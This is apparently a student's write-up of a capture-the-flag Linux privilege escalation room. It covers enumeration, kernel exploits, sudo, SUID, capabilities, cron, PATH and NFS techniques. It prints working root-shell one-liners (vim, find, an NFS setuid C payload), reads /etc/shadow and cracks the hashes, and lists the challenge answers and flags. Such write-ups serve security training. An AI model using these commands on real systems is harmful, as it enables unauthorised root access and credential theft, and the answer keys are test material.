# Linux PrivEsc Room
### Completed 2144 07 JAN 22
### d0nkeyk0ng787/gnome787


### Task 2 - What is Privilege Escalation?
Essentially, privilege escalation is taking a lower user level account and using it to gain access as a root user.This may be by exploiting misconfigured file permissions and extracting the root user password or hash. It may also involve exploiting a SUID to gain a root shelll. 

### Task 3 - Enumeration

Similarly when beginning a pentest, enumeration is the first part of priv esc. It's important to get a lay of the land
so to speak so as to have as much information as possible to aid in the priv esc process. The following are some useful 
commands that return important and very relevant information for priv esc.
	- 'hostname' - returns the hostname of the machine
	- 'uname -a' - returns system information such as additional detail about the kernal used by the system- '/proc/version' - provides information about the system processes
   - '/etc/issue' - contains information about the operating system
   - 'ps' - see the running processes on a linux machine
   - 'env' - returns environment variables
   - 'sudo -l' - lists all commands the current user can run as sudo
   - 'ls -la' - lists all information about the filesystem, i.e file permissions
   - 'id' - returns users privilege level and group memberships
	- '/etc/passwd' - displays the users on a linux system (NOTE: can be converted to an easy list to brute force by doing 'cat /etc/passwd | cut -d ":" -f 1')
	- 'history' - look at previously used commands on the system
	- 'ifconfig' - provides information on the network interfaces of a system. Can identify other networks that can be pivoted to
	- 'netstat' - can be used with different options to gather information on existing connections
		- 'netstat -a': shows all listening ports and established connections.
   	- 'netstat -at' or 'netstat -au': can also be used to list TCP or UDP protocols respectively.
  		- 'netstat -l': list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that 
  		   are listening using the TCP protocol (below)
   - 'find' - used to search the file system for important information and potential priv esc vectors
  		- 'find . -name flag1.txt': find the file named “flag1.txt” in the current directory
   	- 'find /home -name flag1.txt': find the file names “flag1.txt” in the /home directory
	   - 'find / -type d -name config': find the directory named config under “/”
	   - 'find / -type f -perm 0777': find files with the 777 permissions (files readable, writable, and executable by all users)
	   - 'find / -perm a=x': find executable files
	   - 'find /home -user frank': find all files for user “frank” under “/home”
	   - 'find / -mtime 10': find files that were modified in the last 10 days
   	- 'find / -atime 10': find files that were accessed in the last 10 day
	   - 'find / -cmin -60': find files changed within the last hour (60 minutes)
	   - 'find / -amin -60': find files accesses within the last' hour (60 minutes)
	   - 'find / -size 50M': find files with a 50 MB size

Question Answers
	'wade7363'
	'3.13.0-24-generic'
	'Ubuntu 14.04 LTS'
	'2.7.6'
	'CVE-2015-1328'

### Task 4 - Automated Enumeration

 - LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
 - LinEnum: https://github.com/rebootuser/LinEnum
 - LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
 - Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
 - Linux Priv Checker: https://github.com/linted/linuxprivchecker 

### Task 5 - Privilege Escalation: Kernel Exploits

Before we proceed, its important to note that kernel exploits can cause system instability so they should only be used as a last resort or if this
potential outcome is in the scope of your pentest.

The kernel manages the communication between various components such as the memory on the system and applications. As a result of this, the kernel has certain 
privileges that if exploited can potentially lead to root access.

The Kernel exploit methodology is simple;

   Identify the kernel version
   Search and find an exploit code for the kernel version of the target system
   Run the exploit 

Research sources:
	 - Based on your findings, you can use Google to search for an existing exploit code.
    - Sources such as https://www.linuxkernelcves.com/cves can also be useful.
    - Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does
       not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

Hints/Notes:
	 - Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
	 - Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use  
	   or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a 
	   real penetration testing engagement.
	 - Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
    - You can transfer the exploit code from your machine to the target system using the SimpleHTTPServer Python module and wget respectively. 

Question Answers
	'CVE-2015-1328'
	'THM-28392872729920'

### Task 6 - Privilege Escalation: SUDO

The command 'sudo -l' will display all the commands a user can run as root. This can be used to privilege escalate if you can exploit the command. 

Apache can be fun with a config file. If you use '/etc/shadow' as that file it will display the first line of the file. The full command would be
'apache2 -f /etc/shadow'

On some systems, you may see the LD_PRELOAD environment option. This function allows any program to use shared libraries. If the 'env_keep' option is enabled, we are able to generate 
a shared library which will be loaded and executed before the program is run. 

The steps of this privilege escalation vector can be summarized as follows;
   - Check for LD_PRELOAD (with the env_keep option)
   - Write a simple C code compiled as a share object (.so extension) file
   - Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The c code and walkthrough in the following blog post can be used to exploit this function.
https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/

Question Answers
	'3'
	'THM-402028394'
	'sudo nmap --interactive'
	'$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1'

### Task 7 - Privilege Escalation: SUID

Linux privilege control centers largely around managing user and group permissions. This changes with SUID (Set-user identification) and SGID (Set-group identification) which allow files to be executed with the permission level of the file owner or the group owner respectively.

Files with an "s" bit set are the ones with special permission level.

The following command will display the files with SUID & SGID bits set: 'find / -type f -perm -04000 -ls 2>/dev/null'

From here you can compare this returned list with GTFOBins and try find a matching SUID that you can exploit

We see that base64 has the SUID bit and an entry on GTFOBins we can use to exploit
We simply set the LFILE to '/etc/passwd' or '/etc/shadow' with 'LFILE=/etc/passwd' and then run the command 'base64 "$LFILE" | base64 --decode'

We can then use unshadow to get the password hash and then use john the ripper to crack it

'unshadow password.txt shadow.txt > passwords.txt'

For our task this doesn't yield a root password but we can just as easily use this to view our flag file

'LFILE=flag3.txt'
'base64 "$LFILE" | base64 --decode'

Question Answers
	'gerryconway'
	'Password1'
	'THM-3847834'

### Task 8 - Privilege Escalation: Capabilities

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.

We can use the 'getcap' tool to list enabled capabilities.

To avoid getting a heap of errors, input this command 'getcap -r / 2>/dev/null'

We search GTFOBins and find that vim has a usable payload. We simply take it, change ':py' to ':py3' for python3 and get a root shell
'./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")''

Question Answers
	''
	'6'
	'view'
	'THM-9349843'

### Task 9 - Privilege Escalation: Cron Jobs

Crons jobs are simply scripts that have been scheduled to run at specific times. A Cron Table file (crontabs) store the configuration for cron jobs which is stored @ /etc/crontab
	
If a cron job file is configured in such a way that the account you have access to can write to it, then you can edit the file and add some bash code to send a reverse shell to a netcat session on your machine
	
The goal then is to find a cron job created by the root user as cron jobs inherit the privileges of the user who creates them

Any user can read the file keeping system-wide cron jobs under '/etc/crontab'

It's worth noting that whilst CTF machines can have cron jobs that run every minute or so, this is not something that should be expected in the wild. It's more likely you would encounter a cron job that runs daily, weekly or even monthly.

On our machine we can do 'cat /etc/crontab' to see the cron jobs running

Question Answers
'4'
'THM-38300028'
'123456'

### Task 10 - Privilege Escalation: PATH

Question Answers
	'/home/murdoch'
	''
	'THM-736628929'

### Task 11 - Privilege Escalation: NFS

Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM:

'cat /etc/exports'

Note that the /tmp share has root squashing disabled.

On your Kali box, switch to your root user if you are not already running as root:

'sudo su'

Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):

'mkdir /tmp/nfs'
'mount -o rw 10.10.149.204/tmp /tmp/nfs'

From here we can create a very simple payload in c which will change the SUID and SGID bits to root

Payload:
int main()
{
	setgid(0);
	setuid(0)
	system("/bin/bash");
	return 0;
}

Now we compile the c code
'gcc nfs.c -o nfsoutput -w'

Set the SUID bit
'chmod +s nfsoutput'

Back on the target box we can see the file is there, now we run it and gain a root shell
'./nfsoutput'

Question Answers
	'3'
	'3'
	''
	'THM-89384012'

### Task 12 - Capstone Challenge

First I checked 'sudo -l' with no luck

Then I did 'find / -type f -perm -04000 -ls 2>/dev/null' which returns base64 which we can use to see files

This, we can use to access the '/etc/shadow' to gain the password hash. We can crack this and gain access to the 'missy' account
'missy:Password1'

This account gives us the flag1
'THM-42828719920544'

Now on this account we try 'sudo -l' and notice this user can run the '/usr/bin/find' command as root

We head to GTFOBins and grab the exploit for 'find'
'sudo find . -exec /bin/sh \; -quit'

After I input this payload into the terminal, a root shell is generated

From here we can grab the final flag
'THM-168824782390238'
